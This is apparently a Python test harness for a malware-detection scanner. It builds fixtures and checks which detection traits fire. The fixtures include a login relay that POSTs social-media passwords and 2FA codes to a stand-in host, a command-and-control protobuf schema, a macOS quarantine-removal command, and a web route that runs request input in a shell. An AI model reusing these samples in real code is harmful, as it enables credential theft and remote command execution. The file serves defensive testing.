#!/usr/bin/env python3
"""Check tar-triage boundaries without downloading or executing package code."""

import argparse
import io
import json
from pathlib import Path
import subprocess
import tarfile
import tempfile


LOGIN = "micro-behaviors/communications/http/request/body/credential::social-login-secrets-third-party-relay"
TOTP = "micro-behaviors/communications/http/request/body/credential::js-social-login-secret-request"
CARD = "micro-behaviors/data/parse/payment::mastercard-card-number-context"
QUARANTINE = "micro-behaviors/fs/attributes/xattr::node-shell-quarantine-attribute-delete"

RELAY = '''
const axiosBase = require('axios');
async function loginViaAPI(email, password, twoFactor) {
  const baseUrl = config.apiServer || "https://relay.example";
  const endpoint = `${baseUrl}/api/v1/facebook/login_ios`;
  const body = { email, password };
  body.twoFactor = twoFactor.replace(/\\s+/g, "").toUpperCase();
  return axiosBase({method: "POST", url: endpoint, data: body});
}
'''


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--cleave", default="../cleave/target/release/cleave")
    args = parser.parse_args()
    repo = Path(__file__).resolve().parents[2]
    cleave = str((repo / args.cleave).resolve())
    fixtures = {
        "relay.js": RELAY,
        "official.js": RELAY.replace("relay.example", "www.facebook.com"),
        "official-subdomain.js": RELAY.replace("relay.example", "m.facebook.com"),
        "official-instagram.js": RELAY.replace("relay.example", "api.instagram.com").replace("/facebook/", "/instagram/"),
        "official-twitter.js": RELAY.replace("relay.example", "api.twitter.com").replace("/facebook/", "/twitter/"),
        "provider-lookalike.js": RELAY.replace("relay.example", "facebook.com.relay.example"),
        "no-send.js": RELAY.replace(
            'return axiosBase({method: "POST", url: endpoint, data: body});',
            "return body;",
        ),
        "no-body.js": RELAY.replace(', data: body', ''),
        "get.js": RELAY.replace('method: "POST"', 'method: "GET"'),
        "no-seed.js": RELAY.replace(
            '  body.twoFactor = twoFactor.replace(/\\s+/g, "").toUpperCase();\n', ''
        ),
        "quoted.js": "const example = " + json.dumps(RELAY) + ";\n",
        "comment.js": "/*\n" + RELAY + "\n*/\n",
        "unrelated-post.js": RELAY.replace(
            'return axiosBase({method: "POST", url: endpoint, data: body});',
            "return body;",
        ) + "\n" * 100 + 'axiosBase({method: "POST", url: url, data: metrics});\n',
        "payment.js": 'const label = "mastercard cardNumber";\n',
        "span.js": 'const brand = "mastercard"; render("span", {className: "card-brand"});\n',
        "instruction.md": "Setup adds instructions to CLAUDE.md.\n",
        "message.proto": '''syntax = "proto3";
enum CommandType { PING = 0; }
enum MediaType {
  SCREENSHOT = 1;
}
''',
        "control.proto": '''syntax = "proto3";
service C2Service {
  rpc Register(RegistrationRequest) returns (Response);
  rpc BeaconStream(stream BeaconMessage) returns (stream CommandMessage);
  rpc UploadFile(FileRequest) returns (Response);
  rpc SendCommand(Command) returns (Response);
}
enum CommandType {
  SHELL = 0;
  POWERSHELL = 1;
  SCREENSHOT = 2;
}
''',
        "quarantine.js": '''const {execSync} = require('child_process');
execSync(`xattr -dr com.apple.quarantine "${binPath}"`);
''',
        "quarantine-prose.js": 'const help = \'xattr -dr com.apple.quarantine "binary"\';\n',
        "shell-route.js": '''const {spawn} = require('child_process');
app.post('/hooks/run', (req, res) => {
  const {type, command} = req.body;
  spawn('sh', ['-c', command]);
});
''',
    }
    required = {
        "relay.js": {LOGIN, TOTP},
        "official.js": {TOTP},
        "official-subdomain.js": {TOTP},
        "official-instagram.js": {TOTP},
        "official-twitter.js": {TOTP},
        "provider-lookalike.js": {LOGIN, TOTP},
        "no-seed.js": {LOGIN},
        "payment.js": {CARD},
        "instruction.md": {"micro-behaviors/data/llm/memory::agent-instruction-file-write-language"},
        "message.proto": {
            "metadata/lang/source/naming/declaration::proto-commandtype-enum",
            "metadata/lang/source/naming/declaration::proto-screenshot-enum-value",
        },
        "control.proto": {"objectives/command-and-control/channel/transport::protobuf-c2-control-schema"},
        "quarantine.js": {QUARANTINE},
        "shell-route.js": {"objectives/execution/interpreter/cmd::javascript-web-request-shell-execution"},
    }
    severe = {"relay.js", "provider-lookalike.js", "no-seed.js", "control.proto", "shell-route.js"}
    with tempfile.TemporaryDirectory(prefix="tar-rule-controls-") as tmp:
        work = Path(tmp)
        for name, source in fixtures.items():
            (work / name).write_text(source)
        # Separate archive members must not pool a credential body and an
        # unrelated network call into a single authentication-relay claim.
        with tarfile.open(work / "split-package.tgz", "w:gz") as archive:
            for name, source in {
                "package/package.json": '{"name":"chat-client","version":"1.0.0"}',
                "package/request.js": fixtures["no-send.js"],
                "package/transport.js": 'axiosBase({method: "POST", url: url, data: metrics});\n',
            }.items():
                data = source.encode()
                entry = tarfile.TarInfo(name)
                entry.size = len(data)
                archive.addfile(entry, io.BytesIO(data))
        result = subprocess.run(
            [cleave, "--traits-dir", str(repo), "--all-files", "--format", "json", str(work)],
            check=True, text=True, capture_output=True,
        )
        reports = [json.loads(line) for line in result.stdout.splitlines() if line.strip()]
        files = {Path(f["path"]).name: f for report in reports for f in report["files"]}
        for name in [*fixtures, "split-package.tgz"]:
            traits = files[name].get("traits", [])
            ids = {t["id"] for t in traits}
            obsolete = {
                "objectives/credential-access/browser/session-hijack::facebook-login-third-party-api-relay",
                "objectives/credential-access/browser/session-hijack::facebook-totp-seed-third-party-api-relay",
                "objectives/exfiltration/stealer/credential/value::facebook-totp-seed-third-party-api-relay",
            }
            assert not (obsolete & ids), (name, "obsolete attack claim", obsolete & ids)
            assert not (required.get(name, set()) - ids), (name, "missing", required[name] - ids)
            if name not in {"relay.js", "provider-lookalike.js", "no-seed.js"}:
                assert LOGIN not in ids, (name, "unrelated relay")
            if name not in {"relay.js", "provider-lookalike.js", "official.js", "official-subdomain.js", "official-instagram.js", "official-twitter.js"}:
                assert TOTP not in ids, (name, "no TOTP POST")
            if name == "span.js":
                assert CARD not in ids, (name, "span is not a PAN field")
            if name == "quarantine-prose.js":
                assert QUARANTINE not in ids, (name, "command is not called")
            findings = [t["id"] for t in traits if t["crit"] >= 4]
            assert bool(findings) == (name in severe), (name, findings)
            if name not in severe:
                objectives = [i for i in ids if i.startswith(("objectives/", "well-known/malware/"))]
                assert not objectives, (name, objectives)
            print(f"PASS {name}")
    print(f"{len(fixtures) + 1} tar triage controls passed")


if __name__ == "__main__":
    main()
